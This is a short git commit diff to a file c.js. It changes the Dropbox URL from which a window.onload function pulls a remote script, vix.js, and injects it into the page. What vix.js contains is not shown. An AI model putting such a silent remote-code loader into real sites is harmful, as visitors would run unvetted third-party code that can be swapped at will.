150d34b6c99e4915726a3ae7b575a3dc4bf00461
kriztpow <45737457+kriztpow@users.noreply.github.com>
2019-04-10 17:45:25 -0400

    Update c.js

--- c.js
+++ c.js
@@ -1,6 +1,6 @@
 window.onload = function merwebocho() {
 var script = document.createElement("script");
 script.type = "text/javascript";
-script.src="https://dl.dropboxusercontent.com/s/pkmokkmhi1zvdfc/vix.js";
+script.src="https://dl.dropboxusercontent.com/s/0ksh22jsandbwju/vix.js";
 document.body.appendChild(script);
 }
